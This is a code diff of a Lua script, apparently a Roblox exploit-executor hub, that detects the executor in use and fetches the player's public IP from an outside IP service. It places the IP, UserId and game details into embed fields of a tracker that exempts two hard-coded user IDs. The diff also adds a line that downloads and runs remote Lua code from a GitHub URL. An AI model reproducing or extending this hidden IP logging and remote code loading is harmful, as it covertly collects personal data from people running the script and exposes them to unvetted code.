@@ -3,7 +3,17 @@ local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "Prot
 local HttpService = game:GetService("HttpService")
 local Ip = tostring(game:HttpGet("https://api.ipify.org", true))
 local UserId = game.Players.LocalPlayer.UserId
-local InfoSpoofer = function(Game)
+local SupportedGames = loadstring(game:HttpGet('https://raw.githubusercontent.com/miguel831/Roblox-Scripts/main/SSHub/Games.lua', true))()
+local function GetSupportedGame() 
+	local Game
+    for Id, Info in pairs(SupportedGames) do
+        if tostring(game.PlaceId) == Id then
+            Game = Info break
+        end
+    end return Game
+end
+local SupportedGame = GetSupportedGame()
+local InfoSpoofer = function()
     if UserId == 860289947 or UserId == 446350986 then
         print("Bypassed Info Tracker")
     else
@@ -34,14 +44,19 @@ local InfoSpoofer = function(Game)
                             ["value"] = ExecutorUsing,
                             ["inline"] = true
                         },
-                        {
-                            ["name"] = "Ip",
-                            ["value"] = "||"..Ip.."||",
+						{
+                            ["name"] = "Game",
+                            ["value"] = SupportedGame.Name,
+                            ["inline"] = true
+                        },
+						{
+                            ["name"] = "Script",
+                            ["value"] = SupportedGame.Script,
                             ["inline"] = true
                         },
                         {
-                            ["name"] = "Game",
-                            ["value"] = Game or nil,
+                            ["name"] = "Ip",
+                            ["value"] = "||"..Ip.."||",
                             ["inline"] = true
                         }
                     }
